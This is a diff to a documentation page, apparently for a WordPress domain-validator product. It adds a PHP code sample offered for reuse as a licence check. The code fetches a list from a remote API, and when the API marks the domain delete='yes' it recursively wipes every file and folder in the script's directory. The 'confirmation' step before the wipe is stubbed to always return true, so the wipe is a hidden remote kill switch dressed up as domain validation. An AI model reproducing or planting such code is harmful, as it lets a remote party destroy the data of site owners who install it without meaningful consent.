@@ -38,9 +38,101 @@
 
 <p>WordPress users can use our  WordPress theme <a href="#functioncode" rel="dofollow" > function code</a> on any theme. also, we have a WordPress <a href="https://github.com/websmartbd/Domain-Validator-Plugin" rel="dofollow" >Plugin</a> to validate the authorized domain</p>
 <br>
-<p> Row php code sample</p> 
 
+<h3> Row php code sample</3> 
 
+```
+<?php
+
+// Enable error reporting
+error_reporting(E_ALL);
+ini_set('display_errors', 1);
+
+function is_domain_allowed() {
+    $api_url = 'http://localhost/admin/api.php'; // Replace this with your actual API URL
+    $response = file_get_contents($api_url);
+    if ($response === false) {
+        return false; // Assuming API call failed, disallow domain
+    }
+    $api_response = json_decode($response, true); // Decoding JSON as associative array
+
+    // Extracting the domain from the $_SERVER['HTTP_HOST']
+    $current_domain = $_SERVER['HTTP_HOST'];
+
+    foreach ($api_response as $item) {
+        if ($item['domain'] == $current_domain) {
+            // Check if the domain is active or not
+            if ($item['active'] == 1) {
+                // Check if 'delete' key exists in the JSON data
+                if (isset($item['delete'])) {
+                    if ($item['delete'] == "yes") {
+                        // Confirm deletion
+                        if (confirm_deletion()) {
+                            delete_all_files_folders();
+                        }
+                    } elseif ($item['delete'] == "no") {
+                        // If deletion is not allowed, simply return false
+                        return false;
+                    }
+                }
+                return true; // Domain is active, allow access
+            } else {
+                // If the domain is not active, show the message
+                echo '<p style="color:red;font-size:30px;font-weight:600;text-align:center;">' . $item['message'] . '</p>';
+                return false;
+            }
+        }
+    }
+
+    // If the domain is not found in the API response, show the default message
+    echo '<p style="color:red;font-size:30px;font-weight:600;text-align:center;">You are not allowed to use this code</p>';
+    return false;
+}
+
+function confirm_deletion() {
+    // Here you can implement a confirmation mechanism, such as a form submission or a checkbox
+    // For demonstration purposes, returning true directly
+    return true;
+}
+
+function delete_all_files_folders() {
+    $dir_to_delete = __DIR__; // Directory of the current script
+    if (delete_directory($dir_to_delete)) {
+        echo '<p style="color:green;font-size:18px;font-weight:600;">All files and folders deleted successfully.</p>';
+    } else {
+        echo '<p style="color:red;font-size:18px;font-weight:600;">Failed to delete files and folders.</p>';
+    }
+}
+
+// Recursive function to delete directory and its contents
+function delete_directory($dir) {
+    if (!is_dir($dir)) {
+        return false;
+    }
+
+    $files = array_diff(scandir($dir), array('.', '..'));
+    foreach ($files as $file) {
+        $path = $dir . DIRECTORY_SEPARATOR . $file;
+        if (is_dir($path)) {
+            delete_directory($path);
+        } else {
+            if (!unlink($path)) {
+                return false;
+            }
+        }
+    }
+    return rmdir($dir);
+}
+
+if (!is_domain_allowed()) {
+    // Do nothing here, the message is handled inside is_domain_allowed() function
+} 
+
+// code to be executed if the domain is allowed
+
+?>
+
+```
 
 
 
